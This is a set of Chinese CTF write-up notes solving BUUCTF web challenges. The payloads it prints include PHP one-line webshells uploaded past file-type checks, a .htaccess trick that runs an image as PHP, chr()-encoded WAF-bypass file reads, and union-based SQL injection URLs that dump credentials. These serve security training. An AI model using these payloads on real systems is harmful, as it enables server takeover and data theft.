# 001_[极客大挑战 2019]Http(Http基础)

查看源码找到 Secret.php

打开 Secret.php 按照要求分别伪造

Refere：https://www.Sycsecret.com

X-forwarded-for：127.0.0.1

User-Agent：Syclover

之后发送请求，即可获取flag


# 002_[极客大挑战 2019]Secret File(PHP基础)

获取 action.php

由于 action.php 使用了302跳转，浏览器看不到具体内容，使用 burpsuite 获取 action.php 内容

得到 secr3t.php

之后使用 file=php://filter/convert.base64-encode/resource=flag.php 获取 base64 编码的 flag.php

然后解码获取flag

# 003_[ACTF2020 新生赛]Upload(文件上传)  

删除前端上传检测事件

上传 phtml 格式的一句话木马

```phtml
<script language='php'>@eval($_POST['a']);</script>
```

使用中国菜刀链接服务器获取flag

# 004_[极客大挑战 2019]Upload(文件上传) 

使用 BurpSuite 修改上传文件头为 `Content-Type: image/jpeg`

然后上传 

```phtml
GIF89a? <script language='php'>@eval($_POST['a']);</script>
```

使用中国菜刀链接服务器获取flag

# 005_[RoarCTF 2019]Easy Calc(PHP基础)

## 基础知识

我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] => “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] => 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：

/news.php?%20news[id%00=42"+AND+1=0–

上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。

PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

```
1.删除空白符

2.将某些字符转换为下划线（包括空格）
```

如果 `http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话` 则可以再 `num` 前加一个空格 变成 `http://www.xxx.com/index.php? num = aaaa` 

这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。

## scandir()

列出 参数目录 中的文件和目录，获取flag位置

如果直接使用 `scandir("/")` 发现会被屏蔽，则我们可以使用 `chr(47)` 来对其进行绕过。

```
?%20num=var_dump(scandir(chr(47)))
```

## 获取flag

之后使用 `file_get_contents()` 来获取文件即可


```
num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

# 006_[极客大挑战 2019]LoveSQL(SQL注入)   


首先尝试万能密码

```
?username=admin'or'1'='1&password=admin'or'1'='1
```

获取密码，直接拿获取的密码提交flag，发现错误。

接着尝试

由于是 url 中输入，所以不能用 `#` 得用 `%23`
```
/check.php?username=admin' order by 3%23&password=1     存在
```

可知共3个字段。用 `union` 查询测试注入点（回显点位）：

```
/check.php?username=1' union select 1,2,3%23&password=1
```

得到回显点位为2和3，查询当前数据库名及版本：

```
/check.php?username=1' union select 1,database(),version()%23&password=1
```

接下来查询表

```
/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
```

得到 `geekuser` 和 `l0ve1ysq1` 两个表


查看 `l0ve1ysq1` 表字段 

```
/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
```

获取数据，拿到flag


```
/check.php?username=1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
```


# 007_[极客大挑战 2019]BuyFlag

查看源码 发现 `pay.php`

进入 `pay.php` 发现提示要是

```
You must be a student from CUIT!!!
You must be answer the correct password!!!
```

才能获取 flag

首先查看源码，发现 `password` 是 404a (不能是404，404会被拦截)

```html
<!--
	~~~post money and password~~~
    if (isset($_POST['password'])) {
	    $password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

然后查看 `Cookies` 发现有一个 `user` 变量为 0，尝试将其修改为 1 然后携带 `password` 发送 post 请求。

出现提示需要支付 `money`

再 `password` 后添加 `money` 字段获取

```
?password=404a&money=100000000 
```

出现提示 `money` 字段过长，修改 100000000 为科学计数法再次发送请求

```
?password=404a&money=1e9 
```

成功获取 flag{23e50dfa-f2f3-4b68-bea3-25f96b7acb48}


# 008_[MRCTF2020]你传你🐎呢(文件上传)  

## 预备知识 .htaccess是什么

<br>

> .htaccess文件(或者"分布式配置文件"）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
>
> 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
>
> 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。
>
> 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。

## 创建 .htaccess 文件


```xml
<!-- 注意要指定你上传的文件名和此文件名相同，这样它才能被当作php文件解析 -->
<FilesMatch "a.png">
SetHandler application/x-httpd-php
</FilesMatch>
```


这个文件的意思是 将 `a.png` 文件当作 php 文件来执行

## 上传 .htaccess 文件

使用 BurpSuite 抓包上传 .htaccess 文件

在上传时需要将 `Content-Type: application/octet-stream` 修改为 `Content-Type: image/png`

## 上传一句话木马

```php
<?php eval($_POST['a']);?>
```

将其保存为 `a.png` 文件

之后上传

```
http://3a79e9c3-e27e-40c9-b6e0-af40d2028543.node4.buuoj.cn:81/upload/c7e27b0181f9d00be86497d5427d8574/a.png
```

上传成功后使用蚁剑连接一下获取 flag{677ad6d8-e669-4b94-ad9f-8db2453e338b}


# 009_[护网杯 2018]easy_tornado




